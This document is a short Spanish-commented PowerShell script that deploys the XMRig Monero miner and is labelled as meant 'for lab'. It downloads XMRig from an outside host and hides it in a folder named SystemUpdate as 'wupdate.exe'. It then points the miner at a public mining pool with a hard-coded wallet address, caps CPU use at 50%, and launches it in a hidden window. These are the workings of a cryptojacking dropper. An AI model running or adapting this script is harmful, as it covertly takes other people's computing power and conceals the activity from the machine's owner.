# === DEPLOY XMRig MINERO - Versión 4 (Simple y fiable para lab) ===
$installPath = "C:\ProgramData\SystemUpdate"
New-Item -ItemType Directory -Path $installPath -Force | Out-Null

# Descarga y extrae XMRig
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force

# Copiar y renombrar el ejecutable
$xmrigExe = "$installPath\xmrig-6.25.0\xmrig.exe"
Copy-Item $xmrigExe "$installPath\wupdate.exe" -Force

# Config con tu wallet + 50% núcleos
$configContent = @'
{
    "autosave": true,
    "cpu": {
        "max-threads-hint": 50
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ],
    "background": false,
    "log-file": null
}
'@
$configPath = "$installPath\config.json"
$configContent | Out-File -FilePath $configPath -Encoding utf8 -Force

# === EJECUCIÓN DIRECTA (sin tarea) ===
$exePath = "$installPath\wupdate.exe"
Start-Process -FilePath $exePath -ArgumentList "-c `"$configPath`"" -WindowStyle Hidden -NoNewWindow

Write-Output "=== Minero lanzado directamente (versión 4) ==="
